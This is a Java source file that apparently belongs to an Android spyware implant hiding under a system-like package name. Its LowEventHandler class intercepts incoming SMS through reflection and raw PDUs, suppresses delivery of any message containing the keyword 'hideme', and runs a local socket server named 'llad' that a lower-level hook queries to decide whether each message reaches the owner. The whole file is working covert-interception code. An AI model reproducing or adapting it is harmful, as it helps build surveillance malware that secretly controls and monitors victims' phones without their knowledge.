package com.android.dvci.util;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.os.RemoteException;
import android.telephony.SmsMessage;
import android.util.Log;

import com.android.dvci.auto.Cfg;

import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;

/**
 * Created by zad on 27/02/15.
 */
public class LowEventHandler implements Runnable {

	private static final String TAG = "LowEventHandler";
	private boolean accept =true;
	private LocalServerSocket server = null;
	private final Thread thread;

	public LowEventHandler() {
		thread = new Thread(this);
		thread.start();
	}

	public static int dispatchNormalMessage(Object smsO) {

		if (Cfg.DEBUG) {
			Check.log(TAG + "dispatchNormalMessage: start ok " + smsO);
		}
		int callOrig = 1;
		if (smsO == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage: sms0 null ");
			}
			return callOrig;
		}

		try {
			byte[][] pdus = new byte[1][];
			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage: asking pdu ");
			}
			pdus[0] = Reflect.on(smsO).call("getPdu").get();
			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage: got it");
			}
			SmsMessage sms = SmsMessage.createFromPdu(pdus[0]);

			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage: processing " + sms.getMessageBody());
			}
			if (sms.getMessageBody() != null && sms.getMessageBody().toLowerCase().contains("hideme")) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "dispatchNormalMessage: Don't call origin ");
				}
				callOrig = 0;
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + "dispatchNormalMessage:  call origin");
				}
				callOrig = 1;

			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage: Exception:", e);
			}
		}
		return callOrig;
	}
	public static int dispatchNormalMessage(HashMap<String,String> map_sms) {

		int callOrig = 1;
		map_sms.put(LowEventHandlerDefs.SMS_FIELD_RES_CALL,LowEventHandlerDefs.TRUE);
		try {
			if(map_sms.containsKey(LowEventHandlerDefs.SMS_FIELD_CONTENT)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "dispatchNormalMessage: processing " + map_sms.get(LowEventHandlerDefs.SMS_FIELD_CONTENT));
				}
				if (map_sms.get(LowEventHandlerDefs.SMS_FIELD_CONTENT).toLowerCase().contains("hideme")) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "dispatchNormalMessage: Don't call origin ");
					}
					callOrig = 0;
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + "dispatchNormalMessage:  call origin");
					}
					callOrig = 1;

				}
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage: Exception:", e);
			}
		}
		if(callOrig==0){
			map_sms.put(LowEventHandlerDefs.SMS_FIELD_RES_CALL,LowEventHandlerDefs.FALSE);
		}
		return callOrig;
	}
	public static int dispatchNormalMessagePdu(byte[] pdus) {

		if (Cfg.DEBUG) {
			Check.log(TAG + "dispatchNormalMessage: start ok ");
		}
		int callOrig = 1;
		if (pdus.length==0) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage: pdus zero size ");
			}
			return callOrig;
		}

		try {

			SmsMessage sms = SmsMessage.createFromPdu(pdus);

			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage: processing " + sms.getMessageBody());
			}
			if (sms.getMessageBody() != null && sms.getMessageBody().toLowerCase().contains("hideme")) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "dispatchNormalMessage: Don't call origin ");
				}
				callOrig = 0;
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + "dispatchNormalMessage:  call origin");
				}
				callOrig = 1;

			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "dispatchNormalMessage: Exception:", e);
			}
		}
		return callOrig;
	}

	public void closeSocketServer() {
		accept = false;
		if(server != null) {
			try {
				server.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
			while (server != null) {
				Utils.sleep(100);
			}
		}
	}
	@Override
	public void run() {
		try {
			server = new LocalServerSocket("llad");
			if (Cfg.DEBUG) {
				Check.log(TAG + "Server is ready...");
			}
			while(this.accept) {
				/* wait until a connection is ready */
				try {
					LocalSocket receiver = server.accept();
					if (receiver != null) {
						InputStream input = receiver.getInputStream();
						int timeout = 5;
						while (input.available() == 0 && timeout-- >= 0) {
							Utils.sleep(100);
						}
						if (input.available() > 0) {
							ObjectInputStream ois = new ObjectInputStream(input);
							HashMap <String,String> event = (HashMap) ois.readObject();
							ois.close();
							input.close();
							Log.d(TAG, "GOT DATA " + event);
							if(event.containsKey(LowEventHandlerDefs.EVENT_TYPE)){
							if (event.get(LowEventHandlerDefs.EVENT_TYPE).contentEquals(LowEventHandlerDefs.EVENT_TYPE_SMS)){
								dispatchNormalMessage(event);
							}else{
								event.put(LowEventHandlerDefs.SMS_FIELD_RES_CALL,LowEventHandlerDefs.TRUE);
							}
							String reply = "HANDLED_SMS";
							if (Cfg.DEBUG) {
								Check.log(TAG + "SENT reply ", event);
							}
							}else{
								event = new HashMap<String, String>();
								event.put(LowEventHandlerDefs.SMS_FIELD_RES_CALL,LowEventHandlerDefs.TRUE);
							}
							ObjectOutputStream oos = new ObjectOutputStream(receiver.getOutputStream());
							oos.writeObject(event);
							oos.close();
							receiver.getOutputStream().close();
						}
						receiver.close();
					}
				}catch (Exception e){
					if (Cfg.DEBUG) {
						Check.log(TAG + "run: Exception:", e);
					}
				}
			}
			server.close();
		} catch (IOException ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "IOEXCEPTION", ex);
			}
		}
	}
}
